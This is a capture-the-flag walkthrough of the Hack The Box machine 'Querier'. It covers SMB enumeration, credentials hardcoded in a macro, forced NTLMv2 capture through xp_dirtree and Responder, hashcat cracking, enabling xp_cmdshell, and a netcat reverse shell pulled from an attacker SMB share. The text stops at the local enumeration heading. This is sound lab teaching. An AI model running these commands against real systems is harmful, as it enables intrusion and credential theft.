---
icon: coin-blank
---

# HTB-QUERIER

<figure><img src="../../../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

### ENUMERATION :

```python
┌──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ rustscan -a 10.10.10.125 --ulimit 5000 --range 1-65000 -- -sCV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <https://discord.gg/GFrQsGy>           :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
😵 <https://admin.tryhackme.com>

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.125:135
Open 10.10.10.125:139
Open 10.10.10.125:445
Open 10.10.10.125:1433
Open 10.10.10.125:5985
Open 10.10.10.125:47001
Open 10.10.10.125:49664
Open 10.10.10.125:49665
Open 10.10.10.125:49666
Open 10.10.10.125:49667
Open 10.10.10.125:49670
Open 10.10.10.125:49669
Open 10.10.10.125:49671
Open 10.10.10.125:49668
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-08-01 08:15 UTC
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:15
Completed NSE at 08:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:15
Completed NSE at 08:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:15
Completed NSE at 08:15, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:15
Completed Parallel DNS resolution of 1 host. at 08:15, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 08:15
Scanning 10.10.10.125 [14 ports]
Discovered open port 135/tcp on 10.10.10.125
Discovered open port 139/tcp on 10.10.10.125
Discovered open port 49665/tcp on 10.10.10.125
Discovered open port 49671/tcp on 10.10.10.125
Discovered open port 1433/tcp on 10.10.10.125
Discovered open port 49667/tcp on 10.10.10.125
Discovered open port 445/tcp on 10.10.10.125
Discovered open port 5985/tcp on 10.10.10.125
Discovered open port 49669/tcp on 10.10.10.125
Discovered open port 49666/tcp on 10.10.10.125
Discovered open port 47001/tcp on 10.10.10.125
Discovered open port 49668/tcp on 10.10.10.125
Discovered open port 49670/tcp on 10.10.10.125
Discovered open port 49664/tcp on 10.10.10.125
Completed SYN Stealth Scan at 08:15, 0.48s elapsed (14 total ports)
Initiating Service scan at 08:15
Scanning 14 services on 10.10.10.125
Service scan Timing: About 50.00% done; ETC: 08:17 (0:00:57 remaining)
Completed Service scan at 08:16, 57.25s elapsed (14 services on 1 host)
NSE: Script scanning 10.10.10.125.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:16
Completed NSE at 08:16, 10.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:16
Completed NSE at 08:16, 1.07s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:16
Completed NSE at 08:16, 0.00s elapsed
Nmap scan report for 10.10.10.125
Host is up, received user-set (0.22s latency).
Scanned at 2025-08-01 08:15:06 UTC for 69s

PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2025-08-01T08:16:16+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-01T08:12:52
| Not valid after:  2055-08-01T08:12:52
| MD5:   256f:730a:68ca:7ffb:5b61:d27e:2cb7:34fa
| SHA-1: bf43:9001:ee8a:374a:9fdc:fe61:d5e7:cd68:318e:73ea
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQakADTdCuiadJx0m7Si72cTANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUwODAxMDgxMjUyWhgPMjA1NTA4MDEwODEyNTJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMXXdPDi
| xrYvZTLE5P5BzKTcs4AlfT/HgHnhTOGXDx00H8y53HjrpuI5rE/Lu4e/fF5NJ42l
| 4KwVpppRIH0Eo2YdaM0l8sAEsY2CVRUDvnLqwWuPN9Dc8e8arM03/2oMbnoYMp/R
| MdJ4h5C87GZ5/U+bCtToBUvcVy+tKn4bnk+XLdrIhCfujEe9LT2YFQE04YLI0P//
| RFEZphhxiyxNNHAZTy8hoag+Skl0Ow+RXj0Z7pW5F1ZyZgjd1VY2y2iSPswIYUai
| HT2FfzqUVHIGC4TXf11a6vzsP7GFhnX/WJnN8gx57QYxV9lDSHKTTi/1TPyfZRMz
| V3eNfFLwjpIWUOECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAMHAxVqvaf2EzthxH
| cuCSmAg/l97P2xXdB2LlWXPa1oM3ywgja55gWWmkXiU5C8xTmkUsUoosOgaJRGAW
| psL1FZX4333uyk3uEDpa+B3MFSpNh6sWI6W+5obTLLJYKv/Ic42oIBZrlZ+2etFg
| 9TqxEiqtx+de3+xXkxPSDmkbkoVJK02t9W5FZX0zZRwJ3zChHNeIAwWt5D7oOcMI
| kocWcUyi9v4M977RJOniRcn2ufRcgZWfK3lKs54YQC2ojelPXMp+LPNDTUOyoRWL
| BiXVJUlmbiKqPX4n2whr5+zrUoRE41PUX1gYaG4vIFHQEgp4xY1perKx+OYymw0q
| ct4n/Q==
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-01T08:16:07
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10624/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24041/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 40571/udp): CLEAN (Timeout)
|   Check 4 (port 23578/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:16
Completed NSE at 08:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:16
Completed NSE at 08:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:16
Completed NSE at 08:16, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 69.56 seconds
           Raw packets sent: 14 (616B) | Rcvd: 14 (616B)

```

### SMBMAP

```python
┌──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ smbmap -H 10.10.10.125                                                      

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\
  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)
   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/
    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /
   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\
  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     <https://github.com/ShawnDEvans/smbmap>

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.10.10.125, no fun for you...                                                                         
[*] Closed 1 connections    
```

### SMBCLEINT

```python
┌──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ smbclient -N -L //10.10.10.125

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

#### Found Reports share now will login that

```python
┌──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ smbclient -N //10.10.10.125/Reports 
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Mon Jan 28 23:23:48 2019
  ..                                  D        0  Mon Jan 28 23:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 22:21:34 2019

                5158399 blocks of size 4096. 810459 blocks available
smb: \\> get Currency Volume Report.xlsm 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\Currency
smb: \\> mget *
Get file Currency Volume Report.xlsm? y
getting file \\Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (7.6 KiloBytes/sec) (average 7.6 KiloBytes/sec)
smb: \\> 

```

Found file : `Currency Volume Report.xlsm`

#### **Key Finding: Embedded Database Credentials in Script**

While reviewing the script, one of the most critical and revealing segments was the section responsible for establishing a connection with the backend database. The following snippet was found:

```
Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

```

This snippet exposes **hardcoded database credentials** which can be exploited for direct access:

* **Username:** `reporting`
* **Password:** `PcwTWTHRwryjc$c6`
* **Server:** `QUERIER`
* **Database:** `volume`

The use of `Trusted_Connection=no` confirms it's using **SQL authentication** instead of Windows integrated authentication, allowing any attacker with these credentials to connect externally using SQL tools like `sqlcmd`, `ODBC`, or GUI clients like DBeaver/HeidiSQL.

> 💡 Note: Hardcoded credentials in scripts are a severe security flaw, commonly abused during internal pentests and CTF scenarios.

### MSSQL

```python
──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\\reporting  reporting@volume)> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         

server                         VIEW ANY DATABASE   

SQL (QUERIER\\reporting  reporting@volume)> SELECT name FROM master.sys.databases;
name     
------   
master   

tempdb   

model    

msdb     

volume   

SQL (QUERIER\\reporting  reporting@volume)> USE volume;
ENVCHANGE(DATABASE): Old Value: volume, New Value: volume
INFO(QUERIER): Line 1: Changed database context to 'volume'.
SQL (QUERIER\\reporting  reporting@volume)> SELECT name FROM sysobjects WHERE xtype = 'U';
name   
----   
SQL (QUERIER\\reporting  reporting@volume)> 

```

#### what we did here

**MSSQL Access via Discovered Credentials**

After identifying hardcoded SQL credentials in the script, the next logical step was to attempt a connection to the SQL Server hosted on the target (`QUERIER`). Since the authentication is SQL-based (as shown by `Trusted_Connection=no`), we can utilize the `mssqlclient.py` tool from **Impacket** to interact with the database.

#### **Establishing the Connection**

Using the retrieved credentials (`reporting : PcwTWTHRwryjc$c6`), I initiated a connection:

```bash
mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth

```

Upon successful connection, the following was observed:

* Automatic switch to TLS encryption
* Database context changed to `volume`
* Language set to `us_english`
* Server responded as a Microsoft SQL Server (version 14.0)

We now land at the SQL prompt:

```bash
SQL>

```

***

#### **Initial Enumeration**

To assess privileges and discover accessible resources, I executed the following:

#### **Check User Permissions**

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

```

Result:

| entity\_name | subentity\_name | permission\_name  |
| ------------ | --------------- | ----------------- |
| server       |                 | CONNECT SQL       |
| server       |                 | VIEW ANY DATABASE |

**Interpretation**: The current user has rights to connect and enumerate databases, but not elevated administrative rights yet.

#### **List All Databases**

```sql
SELECT name FROM master.sys.databases;

```

Output:

* master
* tempdb
* model
* msdb
* **volume**

The `volume` database (referenced in the script) appears to be custom and worth exploring further.

#### **Inspect User-Created Tables in 'volume'**

```sql
USE volume;
SELECT name FROM sysobjects WHERE xtype = 'U';

```

Although the query executed successfully, the output did not return any meaningful or user-created tables.

***

#### **Next Step – Privilege Escalation Attempt**

Since we already have access to the SQL environment but with limited rights, the next phase involves checking for misconfigurations or privileges that can be leveraged for **database privilege escalation**.

(_Further steps could include checking for `xp_cmdshell` access, impersonation tokens, or misconfigured stored procedures._

### **Database Privilege Escalation via NTLMv2 Capture (User: `reporting` ➝ `mssql-svc`)**

After gaining access to the SQL Server as the low-privileged `reporting` user, the next move was to explore potential paths for **lateral movement** or **privilege escalation**.

A reliable technique involves leveraging the `xp_dirtree` stored procedure to trigger an outbound authentication attempt from the SQL server — which can be captured using **Responder**.

***

#### **Step 1: Setting Up Responder to Catch NTLM Hashes**

To capture authentication attempts, I launched **Responder** on my Kali machine (connected via `tun0` interface):

```bash
┌──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ sudo responder -I tun0

[sudo] password for sn0x: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> <https://github.com/sponsors/lgandx>
  Paypal  -> <https://paypal.me/PythonResponder>

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.5]
    Responder IPv6             [dead:beef:2::1003]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-075QMZIR95W]
    Responder Domain Name      [V51B.LOCAL]
    Responder DCE-RPC Port     [46648]

```

Upon startup, Responder begins listening for various protocols including SMB, HTTP, and others. The SMB service is especially critical here since we’ll be abusing it for forced authentication.

***

#### **Step 2: Triggering Authentication via `xp_dirtree`**

With Responder active, I switched back to the MSSQL shell (connected as `reporting`) and executed the following command to trick the SQL server into querying a non-existent SMB share hosted on my attack machine:

```sql
SQL (QUERIER\\reporting  reporting@volume)>  EXEC xp_dirtree '\\\\10.10.14.5\\a'; 
SQL (-@volume)>  EXEC xp_dirtree '\\\\10.10.14.5\\a'; 
SQL (-@volume)>  EXEC xp_dirtree '\\\\10.10.14.5\\a'; 
SQL (-@volume)> EXEC xp_dirtree '\\\\10.10.14.5\\a'; 
```

Although this query doesn't return any result in the SQL shell, it **forces the SQL server to attempt authentication** with my IP over SMB. This is enough for Responder to capture the **Net-NTLMv2 challenge-response hash**.

***

#### **Step 3: Capturing the NTLMv2 Hash**

Within seconds, the Responder console displayed the captured hash:

```python
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:603386f497f98c33:CDE796E771AA42296023CFE3DF531FD7:0101000000000000C0653150DE09D201C1D5449F39E6185B000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000237D06AB3470A72BFB64FBDC7EE605FD85661EA58867468F6B9360642BBC52DD0A001000000000000000000000000000000000000900200063006900660073002
F00310030002E00310030002E00310034002E0031003400000000000000000000000000
[*] Skipping previously captured hash for QUERIER\\mssql-svc

```

The username `mssql-svc` belongs to a more privileged user, and this hash can now be cracked offline.

***

#### **Step 4: Cracking Net-NTLMv2 Hash using Hashcat**

With the hash in hand, I turned to `hashcat` to attempt a brute-force attack using a wordlist:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ hashcat -m 5600 mssql-svc.netntlmv2 /usr/share/wordlists/rockyou.txt -o cracked.txt --force

hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MSSQL-SVC::QUERIER:603386f497f98c33:cde796e771aa422...000000
Time.Started.....: Fri Aug  1 08:43:47 2025, (8 secs)
Time.Estimated...: Fri Aug  1 08:43:55 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1152.7 kH/s (1.26ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8962048/14344385 (62.48%)
Rejected.........: 0/8962048 (0.00%)
Restore.Point....: 8957952/14344385 (62.45%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: correita.54 -> coreyr1
Hardware.Mon.#1..: Util: 46%

Started: Fri Aug  1 08:43:34 2025
Stopped: Fri Aug  1 08:43:55 2025

┌──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ cat cracked.txt

MSSQL-SVC::QUERIER:603386f497f98c33:cde796e771aa42296023cfe3df531fd7:0101000000000000c0653150de09d201c1d5449f39e6185b000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000237d06ab3470a72bfb64fbdc7ee605fd85661ea58867468f6b9360642bbc52dd0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00:corporate568

```

💡 _Note_: The mode `5600` corresponds to NetNTLMv2.

After a short run, the password was successfully recovered:

```bash
Username: mssql-svc
Password: corporate568

```

***

#### **Step 5: Logging in as Elevated User**

Armed with the newly cracked credentials, I initiated another MSSQL session — this time as `mssql-svc`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ mssqlclient.py mssql-svc:'corporate568'@10.10.10.125 -windows-auth

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\\mssql-svc  dbo@master)>
```

The login succeeded, and I now had access to the database as a more **privileged context**, possibly unlocking further enumeration and exploitation opportunities (e.g., enabling `xp_cmdshell`, accessing sensitive tables, or pivoting further).

***

### Privilege Escalation to `mssql-svc` ➝ Remote Code Execution via `xp_cmdshell`

***

#### **New Login with Higher Privileges**

After cracking the Net-NTLMv2 hash, I now have valid credentials for a more privileged SQL account:

* **Username:** `mssql-svc`
* **Password:** `corporate568`

I used these credentials to authenticate using **Impacket’s `mssqlclient.py`**:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ mssqlclient.py mssql-svc:'corporate568'@10.10.10.125 -windows-auth

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\\mssql-svc  dbo@master)>

```

Connection was successful. This time, the session loaded with `master` database and default SQL language settings (`us_english`).

***

#### 🕵️ **Privilege Discovery – Server-Level Enumeration**

Once logged in, I checked the available privileges with:

```sql
──(sn0x㉿sn0x)-[~/HTB/QURIER]
└─$ mssqlclient.py mssql-svc:'corporate568'@10.10.10.125 -windows-auth

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\\mssql-svc  dbo@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name                   
-----------   --------------   -------------------------------   
server                         CONNECT SQL                       

server                         SHUTDOWN                          

server                         CREATE ENDPOINT                   

server                         CREATE ANY DATABASE               

server                         CREATE AVAILABILITY GROUP         

server                         ALTER ANY LOGIN                   

server                         ALTER ANY CREDENTIAL              

server                         ALTER ANY ENDPOINT                

server                         ALTER ANY LINKED SERVER           

server                         ALTER ANY CONNECTION              

server                         ALTER ANY DATABASE                

server                         ALTER RESOURCES                   

server                         ALTER SETTINGS                    

server                         ALTER TRACE                       

server                         ALTER ANY AVAILABILITY GROUP      

server                         ADMINISTER BULK OPERATIONS        

server                         AUTHENTICATE SERVER               

server                         EXTERNAL ACCESS ASSEMBLY          

server                         VIEW ANY DATABASE                 

server                         VIEW ANY DEFINITION               

server                         VIEW SERVER STATE                 

server                         CREATE DDL EVENT NOTIFICATION     

server                         CREATE TRACE EVENT NOTIFICATION   

server                         ALTER ANY EVENT NOTIFICATION      

server                         ALTER SERVER STATE                

server                         UNSAFE ASSEMBLY                   

server                         ALTER ANY SERVER AUDIT            

server                         CREATE SERVER ROLE                

server                         ALTER ANY SERVER ROLE             

server                         ALTER ANY EVENT SESSION           

server                         CONNECT ANY DATABASE              

server                         IMPERSONATE ANY LOGIN             

server                         SELECT ALL USER SECURABLES        

server                         CONTROL SERVER

```

The result clearly showed that `mssql-svc` holds **extensive rights**, including:

* `ALTER ANY LOGIN`, `ALTER ANY DATABASE`, `ALTER SERVER STATE`
* `IMPERSONATE ANY LOGIN`
* `CONTROL SERVER` (Full server-level control)
* `CONNECT ANY DATABASE`, `VIEW SERVER STATE`
* ...and more.

> 🔑 This confirms that mssql-svc is a highly privileged account, capable of performing administrative actions — including enabling dangerous features like xp\_cmdshell.

***

#### **Activating `xp_cmdshell` for Code Execution**

Initially, attempts to use `xp_cmdshell` failed, since the feature was disabled. However, as `mssql-svc`, I had rights to enable it.

Instead of typing long T-SQL commands, I used the **shortcut command built into `mssqlclient.py`**:

```sql
SQL (QUERIER\\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\\mssql-svc  dbo@master)> 
```

This executed the following under the hood:

```sql
SQL (QUERIER\\mssql-svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\\mssql-svc  dbo@master)> RECONFIGURE;
SQL (QUERIER\\mssql-svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\\mssql-svc  dbo@master)> RECONFIGURE;
SQL (QUERIER\\mssql-svc  dbo@master)> 
```

Once enabled, I confirmed code execution by running:

```sql
SQL (QUERIER\\mssql-svc  dbo@master)> xp_cmdshell whoami

```

Output:

```perl
SQL (QUERIER\\mssql-svc  dbo@master)> xp_cmdshell whoami
output              
-----------------   
querier\\mssql-svc   

NULL                

SQL (QUERIER\\mssql-svc  dbo@master)> 
```

Success — I now had **command execution** as the SQL service account on the target machine.

***

### **Spawning a Reverse Shell with Netcat**

With `xp_cmdshell` enabled, the next step was to get an **interactive shell**. I hosted a Netcat binary on my Kali box via SMB.

#### Step 1: Host Netcat Over SMB

```bash
# Place nc64.exe inside smb/ directory
ls smb/
nc64.exe

# Start SMB server with Impacket
smbserver.py -smb2support a smb/

```

#### Step 2: Start Netcat Listener

```bash
rlwrap nc -lnvp 443

```

#### Step 3: Trigger Shell from MSSQL

Back in the SQL client:

```sql
xp_cmdshell \\\\10.10.14.14\\a\\nc64.exe -e cmd.exe 10.10.14.14 443

```

This command tells the server to **download Netcat from the SMB share and execute it**, connecting back to port 443 on the attacker machine.

***

#### **Reverse Shell: SUCCESS**

Netcat listener immediately caught the incoming connection:

```
Ncat: Connection from 10.10.10.125:49683
Microsoft Windows [Version 10.0.17763.292]
C:\\Windows\\system32>

```

**Shell obtained as `mssql-svc` on the target!**

***

### Local Enumeration for Privilege Escalation

***

#### Step 4: Local Enumeration for Privilege Escalation

